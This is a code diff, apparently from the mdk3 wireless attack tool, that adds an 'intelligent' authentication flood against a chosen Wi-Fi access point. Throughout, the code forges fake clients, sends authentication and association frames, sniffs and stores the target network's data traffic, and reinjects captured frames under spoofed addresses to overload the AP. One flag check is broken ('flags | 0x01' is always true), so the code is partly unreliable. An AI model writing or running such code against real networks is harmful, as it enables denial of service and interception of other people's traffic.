@@ -18,6 +18,8 @@
 #define AUTH_DOS_STATUS_AUTHED	1
 #define AUTH_DOS_STATUS_READY	2
 
+const unsigned long max_data_size = 33554432L;	// mdk will store up to 32 MB of captured traffic
+
 struct auth_dos_options {
   struct ether_addr *target;
   unsigned char valid_mac;
@@ -25,11 +27,27 @@ struct auth_dos_options {
   unsigned int speed;
 };
 
+struct ia_stats
+{
+  unsigned int c_authed;
+  unsigned int c_assoced;
+  unsigned int c_kicked;
+  unsigned int c_created;
+  unsigned int c_denied;
+
+  unsigned int d_captured;
+  unsigned int d_sent;
+  unsigned int d_responses;
+  unsigned int d_relays;
+} ia_stats;
+
 //Global things, shared by packet creation and stats printing
 pthread_t *sniffer = NULL;
-struct clistauthdos *aps = NULL, *increment_here = NULL;
+struct clistauthdos *aps = NULL, *increment_here = NULL, *cl = NULL;
 unsigned int apcount = 0;
 struct ether_addr client, bssid;
+struct clist *dataclist = NULL;
+
 
 void auth_dos_shorthelp()
 {
@@ -161,6 +179,108 @@ void auth_dos_sniffer() {
 }
 
 
+void auth_dos_intelligent_sniffer(void *target) {
+  struct clistauthdos *search;
+  unsigned long data_size = 0;
+  char size_warning = 0;
+  struct packet pkt;
+  struct ether_addr *src, *dest, *bssid, *target_ap = (struct ether_addr *) target;
+  struct ieee_hdr *hdr;
+  struct auth_fixed *af;
+  
+  while (1) {
+    pkt = osdep_read_packet();
+    if (pkt.len == 0) exit(-1);
+    
+    bssid = get_bssid(&pkt);
+    dest = get_destination(&pkt);
+    
+    if (! MAC_MATCHES(*bssid, *target_ap)) continue;	// skip packets from other sources
+
+    hdr = (struct ieee_hdr *) pkt.data;
+    
+    switch (hdr->type) {
+
+      case IEEE80211_TYPE_AUTH:
+	// Authentication Response
+	af = (struct auth_fixed *) (pkt.data + sizeof(struct ieee_hdr));
+	if (af->status != AUTH_STATUS_SUCCESS) {
+	  ia_stats.c_denied++;
+	  break;
+	}
+	search = search_ap(cl, *dest);
+	if (search == NULL) break;
+	if (search->status < AUTH_DOS_STATUS_AUTHED) {	//prevent problems since many APs send multiple responses
+	  search->status = AUTH_DOS_STATUS_AUTHED;
+	  ia_stats.c_authed++;
+	}
+	break;
+
+	case IEEE80211_TYPE_ASSOCRES:
+	  // Association Response
+	  // We don't care if its successful, we just send data to let the AP do some work when deauthing the fake client again
+	  search = search_ap(cl, *dest);
+	  if (search == NULL) break;
+	  if (search->status < AUTH_DOS_STATUS_READY) {	//prevent problems since many APs send multiple responses
+	    search->status = AUTH_DOS_STATUS_READY;
+	    ia_stats.c_assoced++;
+	  }
+	  break;
+
+	case IEEE80211_TYPE_DEAUTH:
+	case IEEE80211_TYPE_DISASSOC:
+	  // Deauth and Disassociation (fake client gets kicked)
+	  search = search_ap(cl, *dest);
+	  if (search == NULL) break;
+	  if (search->status != AUTH_DOS_STATUS_NEW) {	//Count only one deauth if the AP does flooding
+	    search->status = AUTH_DOS_STATUS_NEW;
+	    ia_stats.c_kicked++;
+	  }
+	  break;
+
+	case IEEE80211_TYPE_DATA:
+	  src = get_source(&pkt);
+
+	  // Check if packet got relayed (source adress == fake mac)
+	  search = search_ap(cl, *src);
+	  if (search != NULL) {
+	    ia_stats.d_relays++;
+	    break;
+	  }
+
+	  // Check if packet is an answer to an injected packet (destination adress == fake mac)
+	  search = search_ap(cl, *dest);
+	  if (search != NULL) {
+	    ia_stats.d_responses++;
+	    break;
+	  }
+
+	  // If it's none of these, check if the maximum lenght is exceeded
+	  if (data_size < max_data_size) {
+	    if ((pkt.data[1] & 3) != 3) {	// Ignore WDS packets, too lazy to move data around in there
+	      dataclist = add_to_clist(dataclist, pkt.data, pkt.len, pkt.len);
+	      // increase ia_stats captured counter & data_size
+	      ia_stats.d_captured++;
+	      data_size += pkt.len;
+	    }
+	  } else {
+	    if (!size_warning) {
+	      printf("--------------------------------------------------------------\n");
+	      printf("WARNING: mdk3 has now captured more than %ld MB of data packets\n", max_data_size / 1024 / 1024);
+	      printf("         New data frames will be ignored to save memory!\n");
+	      printf("--------------------------------------------------------------\n");
+	      size_warning = 1;
+	    }
+	  }
+	  
+
+	default:
+	    // Not interesting, count something???
+	    break;
+	}
+    }
+}
+
 struct ether_addr auth_dos_get_target() {
   struct clistauthdos *start;
   char frozen_only = 1;
@@ -200,20 +320,59 @@ struct ether_addr auth_dos_get_target() {
 }
 
 
-struct packet auth_dos_intelligent_getpacket(struct auth_dos_options *options) {
-  struct clistauthdos *search, *cl = NULL;
-  static int oldclient_count = 0, init_intelligent = 0;
-  static unsigned char capabilities[2];
-  static unsigned char *ssid;
-  struct ether_addr *fmac, *ap;
-  struct packet beacon;
+struct packet auth_dos_get_data(struct ether_addr client, struct ether_addr bssid) {
+  struct packet retn;
+  struct ether_addr *dst, *src, *bss, dstcopy;
   struct ieee_hdr *hdr;
+    
+  //NOTE: ToDS frames are being reinjected with the source address of one of the fake nodes
+  //      FromDS frames are being rebroadcastet by setting ToDS flag + Broadcast destination
+    
+  //Skip some packets for variety
+  dataclist = dataclist->next;
+  dataclist = dataclist->next;
+
+  //Copy packet out of the list
+  retn.data = malloc(dataclist->data_len);
+  memcpy(retn.data, dataclist->data, dataclist->data_len);
+  retn.len = dataclist->data_len;
   
-  if (! init_intelligent) {
+  dst = get_destination(&retn);
+  dstcopy = *dst;	//Copy original dst
+  
+  hdr = (struct ieee_hdr *) retn.data;
+  
+  if (hdr->flags | 0x01) { //ToDS set -> reinject with fake source
+    src = get_source(&retn);
+    *src = client;
+  } else { //FromDS -> set ToDS, and rebuild all MAC addresses
+    hdr->flags &= 0xFC;	// Clear DS field
+    hdr->flags |= 0x01;	// Set ToDS bit
+    src = get_source(&retn);
+    dst = get_destination(&retn);
+    bss = get_bssid(&retn);
+    *src = client;
+    *bss = bssid;
+    MAC_SET_BCAST(*dst);
+  }
+
+  return retn;
+}
+
+
+struct packet auth_dos_intelligent_getpacket(struct auth_dos_options *aopt) {
+  struct clistauthdos *search;
+  static int oldclient_count = 0;
+  static char *ssid;
+  struct ether_addr fmac, *ap;
+  struct packet beacon, pkt;
+  struct ieee_hdr *hdr;
+  static uint16_t capabilities;
+  
+  if (! cl) {
     // Building first fake client to initialize list
     if (aopt->valid_mac) fmac = generate_mac(MAC_KIND_CLIENT);
       else fmac = generate_mac(MAC_KIND_RANDOM);
-    init_clist(&cl, fmac, 0, ETHER_ADDR_LEN);
     cl = add_to_clistauthdos(cl, fmac, AUTH_DOS_STATUS_NEW, 0, 0);
     
     // Setting up statistics counters
@@ -229,76 +388,83 @@ struct packet auth_dos_intelligent_getpacket(struct auth_dos_options *options) {
     // Starting the response sniffer
     if (! sniffer) {
       sniffer = malloc(sizeof(pthread_t));
-      pthread_create(sniffer, NULL, (void *) auth_dos_intelligent_sniffer, (void *) NULL);
+      pthread_create(sniffer, NULL, (void *) auth_dos_intelligent_sniffer, (void *) aopt->target);
     }
 
     // Sniff one beacon frame to read the capabilities of the AP
     printf("Sniffing one beacon frame to read capabilities and SSID...\n");
     while (1) {
-    beacon = osdep_read_packet();
-    if (beacon.len == 0) exit(-1);
-    hdr = (struct ieee_hdr *) beacon.data;
-    if (hdr->type == IEEE80211_TYPE_BEACON) {
-        ap = get_bssid(beacon);
-        if (MAC_MATCHES(ap, aopt->target)) {
+      beacon = osdep_read_packet();
+      if (beacon.len == 0) exit(-1);
+      hdr = (struct ieee_hdr *) beacon.data;
+      if (hdr->type == IEEE80211_TYPE_BEACON) {
+        ap = get_bssid(&beacon);
+        if (MAC_MATCHES(*ap, *(aopt->target))) {
 	  ssid = get_ssid(&beacon);
-	  //TODO memcpy(capabilities, pkt_sniff+34, 2);
-	  //TODO printf("Capabilities are: %02X:%02X\n", capabilities[0], capabilities[1]);
+	  capabilities = get_capabilities(&beacon);
+	  printf("Capabilities are: 0x%04X\n", capabilities);
 	  printf("SSID is: %s\n", ssid);
+	  free(beacon.data);
 	  break;
 	}
       }
     }
+  }
 
-	// We are now set up
-	init_intelligent = 1;
+  // Skip some clients for more variety
+  cl = cl->next;
+  cl = cl->next;
+
+  if (oldclient_count < 30) {
+    // Make sure that mdk3 doesn't waste time reauthing kicked clients or keeping things alive
+    // Every 30 injected packets, it should fake another client
+    oldclient_count++;
+
+    search = search_authdos_status(cl->next, AUTH_DOS_STATUS_AUTHED);
+    if (search != NULL) {
+      //there is an authed client that needs to be associated
+      //printf("\rAssociating authenticated client "); print_mac(search->ap); printf("\n");
+      pkt = create_assoc_req(search->ap, *(aopt->target), capabilities, ssid, 54);
+      if (aopt->speed) sleep_till_next_packet(aopt->speed);
+      return pkt;
     }
 
-    // Skip some clients for more variety
-    current = current->next;
-    current = current->next;
-
-    if (oldclient_count < 30) {
-	// Make sure that mdk3 doesn't waste time reauthing kicked clients or keeping things alive
-	// Every 30 injected packets, it should fake another client
-	oldclient_count++;
-
-	search = search_status(current->next, 1);
-	if (search != NULL) {
-	    //there is an authed client that needs to be associated
-	    return create_assoc_frame_simple(target, search->data, capabilities, ssid, ssid_len);
-	}
-
-	search = search_status(current->next, 2);
-	if (search != NULL) {
-	    //there is a fully authed client that should send some data to keep it alive
-	    if (we_got_data) {
-		ia_stats.d_sent++;
-		return get_data_for_intelligent_auth_dos(search->data);
-	    }
-	}
+    search = search_authdos_status(cl->next, AUTH_DOS_STATUS_READY);
+    if (search != NULL) {
+      //there is a fully authed client that should send some data to keep it alive
+      if (dataclist) {
+	//printf("\rSending fake data via client "); print_mac(search->ap); printf("\n");
+	ia_stats.d_sent++;
+	pkt = auth_dos_get_data(search->ap, *(aopt->target));
+	if (aopt->speed) sleep_till_next_packet(aopt->speed);
+	return pkt;
+      }
     }
+  }
 
-    // We reach here if there either were too many or no old clients
-    search = NULL;
+  // We reach here if there either were too many or no old clients
+  search = NULL;
 
-    // Search for a kicked client if we didn't reach our limit yet
-    if (oldclient_count < 30) {
-	oldclient_count++;
-	search = search_status(current, 0);
-    }
-    // And make a new one if none is found
-    if (search == NULL) {
-	if (random_mac) fmac = generate_mac(0);
-	    else fmac = generate_mac(1);
-	search = add_to_clist(current, fmac, 0, ETHER_ADDR_LEN);
-	free(fmac);
-	ia_stats.c_created++;
-	oldclient_count = 0;
-    }
+  // Search for a kicked client if we didn't reach our limit yet
+  if (oldclient_count < 30) {
+    oldclient_count++;
+    search = search_authdos_status(cl, AUTH_DOS_STATUS_NEW);
+    //if (search) { printf("\rAuthenticating disconnected client "); print_mac(search->ap); printf("\n"); }
+  }
+  // And make a new one if none is found
+  if (search == NULL) {
+    if (aopt->valid_mac) fmac = generate_mac(MAC_KIND_CLIENT);
+      else fmac = generate_mac(MAC_KIND_RANDOM);
+    search = add_to_clistauthdos(cl, fmac, AUTH_DOS_STATUS_NEW, 0, 0);
+    //printf("\rCreating new client "); print_mac(search->ap); printf("\n");
+    ia_stats.c_created++;
+    oldclient_count = 0;
+  }
 
-    // Authenticate the new/kicked clients
-    return create_auth_frame(target, 0, search->data);
+  // Authenticate the new/kicked clients
+  pkt = create_auth(*(aopt->target), search->ap, 0x0001);
+  if (aopt->speed) sleep_till_next_packet(aopt->speed);
+  return pkt;
 }
 
 
@@ -337,9 +503,17 @@ struct packet auth_dos_getpacket(void *options) {
 }
 
 void auth_dos_print_stats(void *options) {
-  options = options; //prevent warning
-  printf("\rConnecting Client "); print_mac(client);
-  printf(" to target AP "); print_mac(bssid); printf(".\n");
+  struct auth_dos_options *aopt = (struct auth_dos_options *) options;
+  
+  if(aopt->intelligent) {
+    printf("\rClients: Created: %4d   Authenticated: %4d   Associated: %4d   Denied: %4d   Got Kicked: %4d\n",
+	    ia_stats.c_created, ia_stats.c_authed, ia_stats.c_assoced, ia_stats.c_denied, ia_stats.c_kicked);
+    printf("Data   : Captured: %4d   Sent: %4d   Responses: %4d   Relayed: %4d\n",
+	    ia_stats.d_captured, ia_stats.d_sent, ia_stats.d_responses, ia_stats.d_relays);
+  } else {
+    printf("\rConnecting Client "); print_mac(client);
+    printf(" to target AP "); print_mac(bssid); printf(".\n");
+  }
 }
 
 void auth_dos_perform_check(void *options) {
